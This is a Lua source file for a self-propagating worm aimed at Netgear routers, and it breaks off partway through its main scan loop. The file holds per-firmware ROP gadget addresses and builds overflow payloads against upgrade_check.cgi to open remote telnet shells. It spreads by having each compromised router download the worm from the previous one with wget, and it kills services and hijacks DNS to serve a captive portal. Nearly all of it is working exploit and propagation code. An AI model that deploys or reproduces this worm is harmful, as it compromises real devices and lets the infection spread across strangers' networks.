#!/tmp/bin/lua
-- jumper.lua — Self-propagating Netgear exploit worm
-- Runs on compromised routers with BusyBox + Lua 5.4
-- Scans nearby APs, exploits Netgear targets, deploys itself, repeats
--
-- Usage: lua jumper.lua [max_hops] [current_hop]
--   max_hops    — how deep the worm propagates (default: 3)
--   current_hop — current depth (default: 0, set by parent)

local MAX_HOPS = tonumber(arg[1]) or 3
local CUR_HOP  = tonumber(arg[2]) or 0
local TELNET_PORT = 8888
local WORM_PORT = 8880  -- httpd port for serving worm files + portal
local PORTAL_PORT = 80  -- captive portal served here (via iptables redirect)
local CSV_PATH = "/tmp/www/jumper_log.csv"
local CSV_HEADER = "timestamp,hop,ssid,bssid,band,channel,rssi,model,version,target_ip,result"

-- =====================================================================
-- Gadget database (common models)
-- Each entry: { addr_or_list, layout_type }
--   layout: "RHIGH", "SIMPLE", "STANDARD", "D6220"
--   For multi-gadget: addr is {g1, g2, ...}
-- =====================================================================

local GADGETS = {
  WNDR3400V3 = {
    ["1.0.1.24"]=0x44C4BC, ["1.0.1.22"]=0x44BFFC, ["1.0.1.18"]=0x44BABC,
    ["1.0.1.16"]=0x44B7EC, ["1.0.1.14"]=0x44B53C, ["1.0.1.12"]=0x44929C,
    ["1.0.1.8"]=0x448CEC,  ["1.0.1.4"]=0x448A2C,  ["1.0.1.2"]=0x448A2C,
    ["1.0.0.48"]=0x448A2C, ["1.0.0.46"]=0x448A2C, ["1.0.0.38"]=0x44717C,
    ["1.0.0.22"]=0x44626C, ["1.0.0.20"]=0x44623C,
  },
  WNDR3400V2 = {
    ["1.0.0.54"]=0x44858C, ["1.0.0.52"]=0x44848C, ["1.0.0.38"]=0x44632C,
    ["1.0.0.34"]=0x44629C, ["1.0.0.16"]=0x4420DC, ["1.0.0.12"]=0x4420DC,
  },
  WNDR4500 = {
    ["1.0.1.46"]=0x447D5C, ["1.0.1.40"]=0x44719C, ["1.0.1.38"]=0x4460EC,
    ["1.0.1.36"]=0x4460EC, ["1.0.1.20"]=0x4459FC, ["1.0.1.18"]=0x44584C,
    ["1.0.1.6"]=0x4430DC,  ["1.0.0.58"]=0x44257C, ["1.0.0.50"]=0x44257C,
    ["1.0.0.40"]=0x44257C,
  },
  WNDR4500V2 = {
    ["1.0.0.72"]=0x45005C, ["1.0.0.68"]=0x44FF2C, ["1.0.0.64"]=0x44F99C,
    ["1.0.0.62"]=0x44F09C, ["1.0.0.60"]=0x44EE5C, ["1.0.0.56"]=0x44EE5C,
    ["1.0.0.54"]=0x44E0FC, ["1.0.0.50"]=0x44D6DC, ["1.0.0.42"]=0x44D6DC,
    ["1.0.0.36"]=0x4467EC, ["1.0.0.26"]=0x44621C,
  },
  R6300 = {
    ["1.0.2.80"]=0x44727C, ["1.0.2.78"]=0x446C2C, ["1.0.2.76"]=0x446C2C,
    ["1.0.2.70"]=0x446A3C, ["1.0.2.68"]=0x446A3C, ["1.0.2.38"]=0x44673C,
    ["1.0.2.36"]=0x44673C, ["1.0.2.26"]=0x445E1C, ["1.0.2.14"]=0x4443CC,
    ["1.0.2.10"]=0x4443CC, ["1.0.0.90"]=0x4443CC, ["1.0.0.68"]=0x44439C,
  },
  R6300V2 = {
    ["1.0.4.36"]=0x2A65C, ["1.0.4.34"]=0x2A65C, ["1.0.4.32"]=0x2A53C,
    ["1.0.4.28"]=0x29FC0, ["1.0.4.24"]=0x29EE8, ["1.0.4.8"]=0x295D0,
    ["1.0.4.6"]=0x290F0,  ["1.0.4.2"]=0x28C10,  ["1.0.3.30"]=0x28C10,
    ["1.0.3.28"]=0x286D4, ["1.0.3.8"]=0x2862C,  ["1.0.3.2"]=0x2862C,
    ["1.0.2.86"]=0x27CFC, ["1.0.2.72"]=0x27CFC, ["1.0.1.72"]=0x27CD8,
  },
  R7000 = {
    ["9.88"]=0x3CFB4,   ["9.64"]=0x3C3C4,   ["9.60"]=0x38FF4,
    ["9.42"]=0x38978,   ["9.34"]=0x38174,   ["9.32"]=0x38198,
    ["9.28"]=0x37DBC,   ["9.26"]=0x37D1C,   ["9.18"]=0x37B14,
    ["9.14"]=0x37B08,   ["9.12"]=0x3794C,   ["9.10"]=0x3794C,
    ["9.6"]=0x3763C,    ["8.34"]=0x37528,   ["7.12"]=0x36070,
    ["7.10"]=0x32A44,   ["7.6"]=0x329E8,    ["7.2"]=0x32768,
    ["5.70"]=0x32768,   ["5.64"]=0x32520,   ["4.30"]=0x2ED30,
    ["4.28"]=0x2ECF4,   ["4.18"]=0x2ECAC,   ["3.80"]=0x2D5C0,
    ["3.68"]=0x2D5C8,   ["3.60"]=0x2DE64,   ["3.56"]=0x2D568,
    ["3.24"]=0x2D608,   ["2.19"]=0x2D04C,   ["2.16"]=0x2CBEC,
    ["1.22"]=0x2CC00,   ["0.96"]=0x2C990,   ["11.100"]=0x3D000,
  },
  R6400 = {
    ["1.0.1.52"]=0x31994, ["1.0.1.50"]=0x31974, ["1.0.1.46"]=0x31884,
    ["1.0.1.44"]=0x31244, ["1.0.1.42"]=0x31204, ["1.0.1.36"]=0x30D3C,
    ["1.0.1.34"]=0x30BA8, ["1.0.1.26"]=0x30A5C, ["1.0.1.24"]=0x30A10,
    ["1.0.1.22"]=0x30904, ["1.0.1.20"]=0x30648, ["1.0.1.18"]=0x302FC,
    ["1.0.1.12"]=0x2FDF4, ["1.0.1.6"]=0x2F6B4,  ["1.0.0.26"]=0x2F6B4,
    ["1.0.0.24"]=0x2E96C, ["1.0.0.20"]=0x2E840, ["1.0.0.14"]=0x2E924,
  },
  R6400V2 = {
    ["1.0.4.84"]=0xF9C4,  ["1.0.4.82"]=0xF9C4,  ["1.0.4.78"]=0xF980,
    ["1.0.3.66"]=0xF0B0,  ["1.0.2.66"]=0xF0B0,  ["1.0.2.62"]=0xF0B0,
    ["1.0.2.60"]=0xF038,  ["1.0.2.56"]=0x32078, ["1.0.2.52"]=0x31718,
    ["1.0.2.50"]=0x314C4, ["1.0.2.46"]=0x31414, ["1.0.2.44"]=0x313E8,
    ["1.0.2.34"]=0x30E54, ["1.0.2.32"]=0x30E1C, ["1.0.2.14"]=0x30A94,
  },
  R6700 = {
    ["1.0.2.8"]=0x3CFA0, ["1.0.2.6"]=0x38FF4, ["1.0.1.48"]=0x3818C,
    ["1.0.1.46"]=0x37E3C, ["1.0.1.44"]=0x37D1C, ["1.0.1.36"]=0x3779C,
    ["1.0.1.32"]=0x37704, ["1.0.1.26"]=0x371F8, ["1.0.1.22"]=0x361D0,
    ["1.0.1.20"]=0x35D8C, ["1.0.1.16"]=0x35750, ["1.0.1.14"]=0x2EFAC,
    ["1.0.0.26"]=0x2ED28, ["1.0.0.24"]=0x2ED28, ["1.0.0.2"]=0x2D5C8,
  },
  R8000 = {
    ["1.0.4.52"]=0x370E0, ["1.0.4.46"]=0x36DAC, ["1.0.4.28"]=0x365B0,
    ["1.0.4.18"]=0x36110, ["1.0.4.12"]=0x346D8, ["1.0.4.4"]=0x34310,
    ["1.0.4.2"]=0x34284,  ["1.0.3.54"]=0x34028, ["1.0.3.48"]=0x33FE4,
    ["1.0.3.46"]=0x33E84, ["1.0.3.36"]=0x33AC4, ["1.0.3.32"]=0x336F8,
    ["1.0.3.26"]=0x332DC, ["1.0.3.4"]=0x33058,  ["1.0.2.46"]=0x3290C,
    ["1.0.2.44"]=0x326F4, ["1.0.1.16"]=0x2F370, ["1.0.0.110"]=0x2F2A0,
  },
  D6220 = {
    ["1.0.0.52"]=0x417CF8, ["1.0.0.48"]=0x417CF8, ["1.0.0.46"]=0x417CF8,
    ["1.0.0.44"]=0x4179B8, ["1.0.0.40"]=0x4179B8, ["1.0.0.36"]=0x417864,
    ["1.0.0.34"]=0x417864, ["1.0.0.32"]=0x4178D4, ["1.0.0.28"]=0x417804,
    ["1.0.0.24"]=0x41736C, ["1.0.0.22"]=0x416F54, ["1.0.0.16"]=0x416034,
  },
  D6400 = {
    ["1.0.0.88"]=0x417814, ["1.0.0.86"]=0x417814, ["1.0.0.82"]=0x417814,
    ["1.0.0.80"]=0x417814, ["1.0.0.78"]=0x417814, ["1.0.0.74"]=0x417814,
    ["1.0.0.70"]=0x417814, ["1.0.0.68"]=0x417814, ["1.0.0.66"]=0x4177B4,
    ["1.0.0.60"]=0x4176E4, ["1.0.0.58"]=0x4172FC, ["1.0.0.56"]=0x416EF4,
  },
  AC1450 = {
    ["1.0.0.36"]=0x2958C, ["1.0.0.34"]=0x28BD8, ["1.0.0.22"]=0x27CC4,
    ["1.0.0.14"]=0x27CC4, ["1.0.0.8"]=0x27CA4,  ["1.0.0.6"]=0x27CA4,
  },
}

-- Model → payload layout type
local LAYOUT = {
  WNDR3400V3="STANDARD", WNDR3400V2="STANDARD", WNDR4500="STANDARD",
  WNDR4500V2="STANDARD", R6300="STANDARD", R4500="STANDARD",
  R7000="RHIGH", R6400="RHIGH", R6400V2="RHIGH", R6700="RHIGH",
  R8000="RHIGH", R7900="RHIGH", R8300="RHIGH", R8500="RHIGH",
  R6300V2="SIMPLE", AC1450="SIMPLE",
  D6220="D6220", D6400="D6220",
}

-- Models that need utelnetd
local UTELNETD = {
  AC1450=true, R6300V2=true, R6400=true, R6400V2=true,
  R6700=true, R7000=true, R8000=true, R7900=true,
  R8300=true, R8500=true,
}

-- Netgear MAC OUI prefixes (first 8 chars = "xx:xx:xx")
local NETGEAR_OUIS = {
  ["04:a1:51"]=true, ["20:e5:2a"]=true, ["44:94:fc"]=true,
  ["6c:b0:ce"]=true, ["84:1b:5e"]=true, ["a0:04:60"]=true,
  ["b0:7f:b9"]=true, ["c0:ff:d4"]=true, ["28:80:88"]=true,
  ["30:46:9a"]=true, ["38:94:ed"]=true, ["9c:3d:cf"]=true,
  ["e0:46:9a"]=true, ["e0:91:f5"]=true, ["10:0c:6b"]=true,
  ["2c:b0:5d"]=true, ["c4:3d:c7"]=true, ["b0:39:56"]=true,
  ["80:37:73"]=true, ["a0:40:a0"]=true, ["dc:ef:09"]=true,
  ["00:14:6c"]=true, ["00:1b:2f"]=true, ["00:1e:2a"]=true,
  ["00:22:3f"]=true, ["00:26:f2"]=true, ["b4:75:0e"]=true,
  ["f8:73:94"]=true, ["fc:15:b4"]=true, ["c0:3f:0e"]=true,
  ["54:07:7d"]=true, ["78:d2:94"]=true, ["8c:3b:ad"]=true,
}

local NETGEAR_SSID_PATS = {
  "netgear", "orbi", "nighthawk", "wndr", "wnr", "wgr", "r6", "r7", "r8",
}

-- Common gateway IPs to try
local GATEWAY_IPS = {
  "192.168.1.1", "10.0.0.1", "192.168.0.1", "172.16.0.1",
  "192.168.2.1", "192.168.1.254",
}


-- =====================================================================
-- Helpers
-- =====================================================================

local function log(msg)
  io.write("[jumper@hop" .. CUR_HOP .. "] " .. msg .. "\n")
  io.flush()
end

local function exec(cmd)
  return os.execute(cmd)
end

local function exec_out(cmd)
  local h = io.popen(cmd .. " 2>/dev/null", "r")
  if not h then return "" end
  local out = h:read("*a") or ""
  h:close()
  return out
end

local function timestamp()
  local h = io.popen('date +"%Y-%m-%d %H:%M:%S" 2>/dev/null')
  if not h then return "unknown" end
  local ts = h:read("*l") or "unknown"
  h:close()
  return ts
end

local function file_exists(path)
  local f = io.open(path, "r")
  if f then f:close(); return true end
  return false
end

local function sleep(n)
  exec("sleep " .. n)
end

local function port_open(ip, port, timeout)
  timeout = timeout or 3
  -- Use nc with timeout to check port
  local ok = exec("nc -z -w " .. timeout .. " " .. ip .. " " .. port .. " 2>/dev/null")
  return ok == true
end

local function get_my_ips()
  local ips = {}
  local out = exec_out("ifconfig 2>/dev/null")
  for ip in out:gmatch("inet addr:(%d+%.%d+%.%d+%.%d+)") do
    if ip ~= "127.0.0.1" then
      ips[#ips+1] = ip
    end
  end
  -- Also try ip addr format
  for ip in out:gmatch("inet (%d+%.%d+%.%d+%.%d+)") do
    if ip ~= "127.0.0.1" then
      local found = false
      for _, existing in ipairs(ips) do
        if existing == ip then found = true; break end
      end
      if not found then ips[#ips+1] = ip end
    end
  end
  return ips
end


-- =====================================================================
-- CSV Logger
-- =====================================================================

local function csv_init()
  exec("mkdir -p /tmp/www")
  if not file_exists(CSV_PATH) then
    local f = io.open(CSV_PATH, "w")
    if f then
      f:write(CSV_HEADER .. "\n")
      f:close()
    end
  end
end

local function csv_log(ssid, bssid, band, channel, rssi, model, version, target_ip, result)
  local ts = timestamp()
  local safe_ssid = ssid:gsub(",", ";"):gsub('"', "'")
  local row = string.format("%s,%d,%s,%s,%s,%s,%s,%s,%s,%s,%s",
    ts, CUR_HOP, safe_ssid, bssid or "", band or "", channel or "",
    rssi or "", model or "", version or "", target_ip or "", result)
  local f = io.open(CSV_PATH, "a")
  if f then
    f:write(row .. "\n")
    f:close()
  end
end


-- =====================================================================
-- Captive Portal
-- =====================================================================

local function setup_captive_portal()
  log("Setting up captive portal...")

  -- Check if portal.html exists (deployed by v6 or worm)
  if not file_exists("/tmp/www/index.html") then
    -- Minimal fallback if portal.html wasn't deployed
    local f = io.open("/tmp/www/index.html", "w")
    if f then
      f:write("<!DOCTYPE html><html><head><title>Welcome</title></head>")
      f:write("<body style='background:#0a0a0a;color:#00ff41;text-align:center;padding:3em;font-family:sans-serif'>")
      f:write("<h1>Hello World</h1><p>portal served from router</p></body></html>")
      f:close()
    end
  end

  -- Get our LAN IP (br0 is typical bridge interface on Netgear)
  local my_lan_ip = exec_out("ifconfig br0 2>/dev/null"):match("inet addr:(%d+%.%d+%.%d+%.%d+)")
  if not my_lan_ip then
    -- Fallback: try to get any LAN IP
    my_lan_ip = exec_out("ifconfig 2>/dev/null"):match("inet addr:(192%.168%.%d+%.%d+)")
    if not my_lan_ip then
      my_lan_ip = exec_out("ifconfig 2>/dev/null"):match("inet addr:(172%.16%.%d+%.%d+)")
    end
    if not my_lan_ip then
      my_lan_ip = exec_out("ifconfig 2>/dev/null"):match("inet addr:(10%.%d+%.%d+%.%d+)")
    end
  end

  if not my_lan_ip then
    log("WARNING: Could not determine LAN IP for portal redirect")
    return false
  end

  log("LAN IP: " .. my_lan_ip)

  -- Ensure www dir exists
  exec("mkdir -p /tmp/www")

  -- ---------------------------------------------------------------
  -- FREE PORT 80 — kill smbd, nmbd, and any other process on port 80
  -- These routers do NOT have iptables, so we bind httpd directly to :80
  -- ---------------------------------------------------------------
  log("Clearing port 80 for portal...")

  -- Kill Samba processes (smbd/nmbd often squat on port 80)
  exec("killall smbd 2>/dev/null")
  exec("killall nmbd 2>/dev/null")
  sleep(1)

  -- Check if port 80 is still occupied and kill whatever is there
  local p80 = exec_out("netstat -tlnp 2>/dev/null | grep ':80 '")
  for pid in p80:gmatch("(%d+)/") do
    -- Don't kill our own shell (telnetd on 8889)
    local check = exec_out("netstat -tlnp 2>/dev/null | grep " .. pid)
    if not check:find(":8889") then
      log("Killing PID " .. pid .. " on port 80")
      exec("kill " .. pid .. " 2>/dev/null")
    end
  end
  sleep(1)

  -- Start httpd on port 80 (primary portal port)
  local bb = file_exists("/tmp/bin/busybox") and "/tmp/bin/busybox" or
             file_exists("/tmp/bin/busybox-enhanced") and "/tmp/bin/busybox-enhanced" or
             "busybox"
  exec(bb .. " httpd -p 80 -h /tmp/www -c /dev/null 2>/dev/null")

  -- Verify port 80
  local verify80 = exec_out("netstat -tlnp 2>/dev/null | grep ':80 '")
  if verify80:find("busybox") or verify80:find("httpd") then
    log("httpd serving portal on port 80 (primary)")
  else
    log("WARNING: Could not bind port 80 — portal on " .. WORM_PORT .. " only")
  end

  -- Start httpd on port 443 — HTTPS gets fast error instead of hanging
  -- BusyBox httpd doesn't do TLS, but connections won't time out
  exec(bb .. " httpd -p 443 -h /tmp/www -c /dev/null 2>/dev/null")
  log("httpd on port 443 (HTTPS fast-fail)")

  -- Copy portal page to all OS captive portal detection paths
  for _, fname in ipairs({
    "hotspot-detect.html", "generate_204",
    "connecttest.txt", "canonical.html", "success.txt", "ncsi.txt"
  }) do
    exec("cp /tmp/www/index.html /tmp/www/" .. fname)
  end
  -- Chrome/Android alternate path
  exec("mkdir -p /tmp/www/gen_204")
  exec("cp /tmp/www/index.html /tmp/www/gen_204/index.html")
  log("Portal page copied to all detection paths (Apple/Android/Win/FF/Chrome)")

  -- ---------------------------------------------------------------
  -- DNS HIJACK — dnsmasq with config file (avoids ash ~80 char truncation)
  -- ---------------------------------------------------------------
  -- Write config to file (ash truncates long inline commands)
  local cf = io.open("/tmp/dp.conf", "w")
  if cf then
    cf:write("address=/#/" .. my_lan_ip .. "\n")
    cf:close()
  end

  -- Kill existing dnsmasq and restart with our hijack config
  exec("killall dnsmasq 2>/dev/null")
  sleep(1)
  exec("/usr/sbin/dnsmasq -C /tmp/dp.conf 2>/dev/null &")
  sleep(1)

  -- Verify dnsmasq
  local dns_check = exec_out("ps 2>/dev/null | grep dnsmasq | grep -v grep")
  if dns_check:find("dnsmasq") then
    log("DNS hijack active: all queries -> " .. my_lan_ip)
  else
    log("WARNING: dnsmasq may not have started")
  end

  log("Captive portal ready on port 80 + " .. WORM_PORT)
  return true
end


-- =====================================================================
-- Wireless Scanner
-- =====================================================================

local function wl_scan()
  log("Scanning APs on eth1 + eth2...")
  exec("wl -i eth1 scan 2>/dev/null")
  exec("wl -i eth2 scan 2>/dev/null")
  sleep(4)

  local aps = {}
  local seen = {}

  for _, iface in ipairs({"eth1", "eth2"}) do
    local band = (iface == "eth1") and "2.4GHz" or "5GHz"
    local raw = exec_out("wl -i " .. iface .. " scanresults 2>/dev/null")
    if raw == "" or not raw:find("SSID") then goto continue end

    local cur = {}
    for line in raw:gmatch("[^\n]+") do
      line = line:match("^%s*(.-)%s*$")
      if line:sub(1,6) == "SSID: " then
        if cur.ssid and cur.bssid and not seen[cur.bssid:lower()] then
          cur.band = band
          seen[cur.bssid:lower()] = true
          aps[#aps+1] = cur
        end
        cur = { ssid = line:sub(7):match("^%s*(.-)%s*$") }
      elseif line:sub(1,5) == "Mode:" then
        local rssi = line:match("RSSI:%s*(%-?%d+)")
        local ch = line:match("Channel:%s*(%d+)")
        if rssi then cur.rssi = tonumber(rssi) end
        if ch then cur.channel = tonumber(ch) end
      elseif line:sub(1,7) == "BSSID: " then
        cur.bssid = line:sub(8):match("^%s*(.-)%s*$")
      end
    end
    -- last AP
    if cur.ssid and cur.bssid and not seen[cur.bssid:lower()] then
      cur.band = band
      seen[cur.bssid:lower()] = true
      aps[#aps+1] = cur
    end

    ::continue::
  end

  return aps
end

local function is_netgear(ap)
  -- Check OUI
  local oui = (ap.bssid or ""):lower():sub(1,8)
  if NETGEAR_OUIS[oui] then return true end
  -- Check SSID
  local ssid_lower = (ap.ssid or ""):lower()
  for _, pat in ipairs(NETGEAR_SSID_PATS) do
    if ssid_lower:find(pat, 1, true) then return true end
  end
  return false
end

local function get_own_bssid()
  for _, iface in ipairs({"eth1", "eth2"}) do
    local out = exec_out("wl -i " .. iface .. " bssid 2>/dev/null")
    local mac = out:match("(%x%x:%x%x:%x%x:%x%x:%x%x:%x%x)")
    if mac then return mac end
  end
  return nil
end


-- =====================================================================
-- Model/Version Detection
-- =====================================================================

local function detect_model(ip)
  -- GET /currentsetting.htm
  local out = exec_out('wget -q -O - "http://' .. ip .. '/currentsetting.htm" 2>/dev/null')
  if out == "" then return nil, nil end

  local model, fw
  for line in out:gmatch("[^\n]+") do
    line = line:match("^%s*(.-)%s*$")
    if line:sub(1,6) == "Model=" then
      model = line:sub(7)
    elseif line:sub(1,9) == "Firmware=" then
      fw = line:sub(10)
    end
  end
  return model, fw
end

local function normalize_model(m)
  if not m then return nil end
  m = m:upper():gsub(" ", ""):gsub("-", "")
  -- Check if it directly matches a gadget key
  if GADGETS[m] then return m end
  -- Try known patterns
  local patterns = {
    "WNDR3400V3", "WNDR3400V2", "WNDR4500V2", "WNDR4500",
    "R6400V2", "R6300V2", "R6700", "R6400", "R6300",
    "R7000", "R8000", "D6400", "D6220", "AC1450",
  }
  for _, p in ipairs(patterns) do
    if m:find(p, 1, true) then return p end
  end
  return nil
end

local function extract_version(fw)
  if not fw then return nil end
  fw = fw:match("^%s*(.-)%s*$")
  if fw:sub(1,1):upper() == "V" then fw = fw:sub(2) end
  fw = fw:match("^([^_]+)")
  return fw
end


-- =====================================================================
-- Payload Builder
-- =====================================================================

local function pk(addr)
  -- Little-endian 32-bit pack
  return string.pack("<I4", addr)
end

local function build_payload(model, version, cmd)
  local versions = GADGETS[model]
  if not versions then return nil end
  local gadget = versions[version]
  if not gadget then return nil end

  local layout = LAYOUT[model] or "STANDARD"

  -- Header: magic + padding
  local data = "*#$^\0\0\4\0" .. string.rep("A", 0x60)

  if layout == "RHIGH" then
    -- R7000, R6400, R8000 family
    data = data .. string.rep("B", 4) .. string.rep("C", 4)
    data = data .. string.rep("D", 4) .. string.rep("E", 4)
    data = data .. string.rep("F", 4) .. string.rep("G", 4)
    data = data .. string.rep("H", 4) .. string.rep("I", 4)
    data = data .. pk(gadget)
    data = data .. cmd .. "\0"
    data = data .. string.rep("Z", 0x1000)

  elseif layout == "SIMPLE" then
    -- AC1450, R6300V2, R6200V2 family
    data = data .. string.rep("B", 4) .. string.rep("C", 4)
    data = data .. string.rep("D", 4) .. string.rep("E", 4)
    data = data .. pk(gadget)
    data = data .. cmd .. "\0"
    data = data .. string.rep("Z", 0x400)

  elseif layout == "D6220" then
    -- D6220, D6400
    data = data .. string.rep("B", 4) .. string.rep("C", 4)
    data = data .. string.rep("D", 4)
    data = data .. pk(gadget)
    data = data .. string.rep("E", 0x18)
    data = data .. cmd .. "\0"
    data = data .. string.rep("Z", 0x1000)

  else -- STANDARD
    -- WNDR3400V3, WNDR3400V2, R6300, WNDR4500 family
    data = data .. string.rep("B", 4) .. string.rep("C", 4)
    data = data .. string.rep("D", 4) .. string.rep("E", 4)
    data = data .. string.rep("F", 4) .. string.rep("G", 4)
    data = data .. string.rep("H", 4)
    data = data .. pk(gadget)
    data = data .. string.rep("I", 0x78)
    data = data .. cmd .. "\0"
    data = data .. string.rep("Z", 0x1000)
  end

  return data
end

local function get_telnet_cmd(model)
  if UTELNETD[model] then
    return "/bin/utelnetd -p8888 -l/bin/sh -d"
  end
  return "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; " ..
         "mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; " ..
         "telnetd -p8888 -l/bin/sh"
end


-- =====================================================================
-- Exploit Sender
-- =====================================================================

local function send_exploit(ip, model, version)
  local cmd = get_telnet_cmd(model)
  local payload = build_payload(model, version, cmd)
  if not payload then
    log("No payload for " .. model .. " " .. version)
    return false
  end

  -- Build HTTP request
  local http = "POST /upgrade_check.cgi HTTP/1.1\r\n"
  http = http .. "Host: " .. ip .. "\r\n"
  http = http .. "Content-Disposition: AAAA\r\n"
  http = http .. "Content-Length: " .. #payload .. "\r\n"
  http = http .. "Content-Type: application/octet-stream\r\n"
  http = http .. 'name="mtenFWUpload"\r\n'
  http = http .. "\r\n"

  -- Write full request to temp file
  local tmpfile = "/tmp/exploit_" .. ip:gsub("%.", "_") .. ".bin"
  local f = io.open(tmpfile, "wb")
  if not f then
    log("Cannot write exploit file")
    return false
  end
  f:write(http)
  f:write(payload)
  f:close()

  log("Sending exploit (" .. #http + #payload .. " bytes) -> " .. ip .. ":80")

  -- Send via nc
  exec("cat " .. tmpfile .. " | nc -w 5 " .. ip .. " 80 2>/dev/null")
  os.remove(tmpfile)

  -- Wait for telnet
  for _, wait in ipairs({3, 3, 4}) do
    log("Waiting " .. wait .. "s for telnetd...")
    sleep(wait)
    if port_open(ip, TELNET_PORT, 2) then
      log("SUCCESS! Telnet open on " .. ip .. ":" .. TELNET_PORT)
      return true
    end
  end

  log("Telnet did not open on " .. ip)
  return false
end


-- =====================================================================
-- Remote Command Execution (via telnet/nc)
-- =====================================================================

local function remote_exec(ip, port, cmd)
  -- Send a command through nc to the telnet shell
  -- Add small delay after for command to execute
  exec('printf "' .. cmd .. '\\n" | nc -w 3 ' .. ip .. ' ' .. port .. ' >/dev/null 2>&1')
  sleep(1)
end

local function remote_exec_read(ip, port, cmd)
  local out = exec_out('printf "' .. cmd .. '\\n" | nc -w 3 ' .. ip .. ' ' .. port .. ' 2>/dev/null')
  return out
end


-- =====================================================================
-- Self-Propagation
-- =====================================================================

local function start_worm_server()
  -- Set up directory with files the next router needs
  exec("mkdir -p /tmp/worm-serve")
  exec("cp /tmp/bin/lua /tmp/worm-serve/lua 2>/dev/null")
  exec("cp /tmp/bin/busybox /tmp/worm-serve/busybox 2>/dev/null")

  -- Copy self (this script)
  local self_path = arg[0] or "/tmp/jumper.lua"
  exec("cp " .. self_path .. " /tmp/worm-serve/jumper.lua 2>/dev/null")

  -- Copy portal.html for propagation
  exec("cp /tmp/www/index.html /tmp/worm-serve/portal.html 2>/dev/null")

  -- Kill any existing server on WORM_PORT
  exec("kill $(cat /tmp/worm_httpd.pid 2>/dev/null) 2>/dev/null")
  sleep(1)

  -- Start httpd
  exec("/tmp/bin/busybox httpd -p " .. WORM_PORT ..
       " -h /tmp/worm-serve -c /dev/null 2>/dev/null &")
  exec("echo $! > /tmp/worm_httpd.pid")
  sleep(1)
  log("Worm server started on port " .. WORM_PORT)
end

local function deploy_to_target(target_ip, my_ip)
  log("Deploying worm to " .. target_ip .. " from " .. my_ip)

  -- Create PTY devices on target
  local pty_cmds = ""
  for i = 0, 15 do
    pty_cmds = pty_cmds .. "mknod /dev/ptyp" .. i .. " c 2 " .. i .. " 2>/dev/null;"
    pty_cmds = pty_cmds .. "mknod /dev/ttyp" .. i .. " c 3 " .. i .. " 2>/dev/null;"
  end
  remote_exec(target_ip, TELNET_PORT, pty_cmds)

  -- Download BusyBox, Lua, and worm from attacking router
  local dl_cmds = {
    "mkdir -p /tmp/bin",
    "mkdir -p /tmp/www",
    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/busybox -O /tmp/bin/busybox 2>/dev/null",
    "chmod +x /tmp/bin/busybox",
    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/lua -O /tmp/bin/lua 2>/dev/null",
    "chmod +x /tmp/bin/lua",
    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/jumper.lua -O /tmp/jumper.lua 2>/dev/null",
    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/portal.html -O /tmp/www/index.html 2>/dev/null",
  }

  for _, cmd in ipairs(dl_cmds) do
    remote_exec(target_ip, TELNET_PORT, cmd)
  end

  -- Verify downloads
  local check = remote_exec_read(target_ip, TELNET_PORT,
    "ls -la /tmp/bin/lua /tmp/jumper.lua 2>/dev/null && echo WORM_READY")

  if not check:find("WORM_READY") then
    log("WARNING: File deployment may have failed on " .. target_ip)
    -- Try continuing anyway
  end

  -- Start BusyBox telnetd on target for better shell
  remote_exec(target_ip, TELNET_PORT,
    "export PATH=/tmp/bin:$PATH; " ..
    "/tmp/bin/busybox telnetd -p 8889 -l /tmp/bin/busybox -F sh 2>/dev/null &")
  sleep(2)

  -- Launch the worm on target (in background, next hop)
  local next_hop = CUR_HOP + 1
  remote_exec(target_ip, TELNET_PORT,
    "export PATH=/tmp/bin:$PATH; " ..
    "/tmp/bin/lua /tmp/jumper.lua " .. MAX_HOPS .. " " .. next_hop ..
    " > /tmp/jumper.log 2>&1 &")

  log("Worm launched on " .. target_ip .. " (hop " .. next_hop .. ")")
  return true
end


-- =====================================================================
-- Main
-- =====================================================================

local function main()
  log("=== JUMPER WORM v2 (persistent) ===")
  log("Hop " .. CUR_HOP .. "/" .. MAX_HOPS)

  if CUR_HOP >= MAX_HOPS then
    log("Max hop limit reached. Stopping propagation.")
    csv_init()
    csv_log("N/A", "N/A", "", "", "", "", "", "", "max_hops_reached")
    return
  end

  -- Check wl is available
  local wl_path = exec_out("which wl 2>/dev/null"):match("^%s*(.-)%s*$")
  if wl_path == "" then
    log("ERROR: 'wl' command not found. Cannot scan APs.")
    return
  end

  -- Init CSV log
  csv_init()

  -- Get our own BSSID to skip self
  local own_bssid = get_own_bssid()
  if own_bssid then
    log("Own BSSID: " .. own_bssid)
  end

  -- Start serving worm files
  start_worm_server()

  -- Set up captive portal on this router
  setup_captive_portal()

  -- Track already-exploited BSSIDs so we don't re-exploit
  local exploited_bssids = {}
  local total_exploited = 0
  local scan_round = 0
  local SCAN_INTERVAL = 60  -- seconds between scan rounds

  -- ===== PERSISTENT SCAN LOOP =====
  while true do
    scan_round = scan_round + 1
    log("")
    log("========================================")
    log("SCAN ROUND " .. scan_round .. " (exploited so far: " .. total_exploited .. ")")
    log("========================================")

    -- Get our IPs (may change if interfaces come/go)
    local my_ips = get_my_ips()
    if #my_ips == 0 then
      log("WARNING: Could not determine own IP addresses")
    else
      log("My IPs: " .. table.concat(my_ips, ", "))
    end

    -- Scan for APs
    local aps = wl_scan()
    log("Found " .. #aps .. " APs")

    -- Filter for Netgear targets (skip already-exploited)
    local targets = {}
    for _, ap in ipairs(aps) do
      if own_bssid and ap.bssid and ap.bssid:lower() == own_bssid:lower() then
        goto skip
      end
      if ap.bssid and exploited_bssids[ap.bssid:lower()] then
        goto skip  -- already got this one
      end
      if is_netgear(ap) then
        targets[#targets+1] = ap
      end
      ::skip::
    end

    -- Display scan results
    log(string.format("%-30s %-19s %5s %3s %-6s %s",
      "SSID", "BSSID", "RSSI", "Ch", "Band", ""))
    log(string.rep("-", 80))
    for _, ap in ipairs(aps) do
      local is_tgt = false
      local is_done = false
      for _, t in ipairs(targets) do
        if t.bssid == ap.bssid then is_tgt = true; break end
      end
      if ap.bssid and exploited_bssids[ap.bssid:lower()] then
        is_done = true
      end
      log(string.format("%-30s %-19s %5s %3s %-6s %s",
        (ap.ssid or "???"):sub(1,30),
        ap.bssid or "???",
        tostring(ap.rssi or "?"),
        tostring(ap.channel or "?"),
